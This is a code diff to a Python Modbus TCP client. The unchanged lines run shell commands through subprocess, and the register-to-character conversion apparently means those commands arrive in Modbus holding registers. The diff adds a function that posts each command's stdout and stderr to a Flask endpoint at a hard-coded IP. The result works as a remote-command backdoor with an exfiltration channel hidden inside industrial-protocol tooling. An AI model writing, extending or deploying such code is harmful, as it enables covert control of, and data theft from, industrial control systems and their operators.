@@ -2,6 +2,7 @@ import asyncio
 import logging
 from pymodbus.client import AsyncModbusTcpClient
 import subprocess
+import requests
 
 # Configure logging
 logging.basicConfig(level=logging.INFO)
@@ -10,6 +11,9 @@ log = logging.getLogger(__name__)
 # Modbus server parameters
 MODBUS_SERVER_IP = '10.211.4.109'  # Server IP
 MODBUS_SERVER_PORT = 5020        # Server Port
+
+# Flask server URL to send command output
+FLASK_SERVER_URL = 'http://10.211.4.109:5000/receive_output'
 
 async def read_holding_registers(client, address, count):
     log.info(f"Attempting to read {count} holding register(s) starting from address {address}...")
@@ -63,11 +67,26 @@ def execute_dir_command(command):
     # Execute the command
     result = subprocess.run(command, shell=True, capture_output=True, text=True)
 
-    # Print the command output directly
-    print("Command Output:\n")
-    print(result.stdout)  # Print the standard output of the command
-    print("Error Output:\n")
-    print(result.stderr)   # Print the error output if any
+    # Prepare the command output
+    output = {
+        "stdout": result.stdout,  # Standard output of the command
+        "stderr": result.stderr   # Error output (if any)
+    }
+
+    # Send the output to the Flask server
+    send_command_output_to_flask(output)
+
+def send_command_output_to_flask(output):
+    try:
+        # Send a POST request with the output to the Flask server
+        response = requests.post(FLASK_SERVER_URL, json=output)
+        
+        if response.status_code == 200:
+            log.info("Successfully sent command output to Flask server.")
+        else:
+            log.error(f"Failed to send command output. Server responded with status code {response.status_code}.")
+    except Exception as e:
+        log.error(f"Error sending command output to Flask server: {e}")
 
 def registers_to_string(registers):
     # Convert the register values to characters
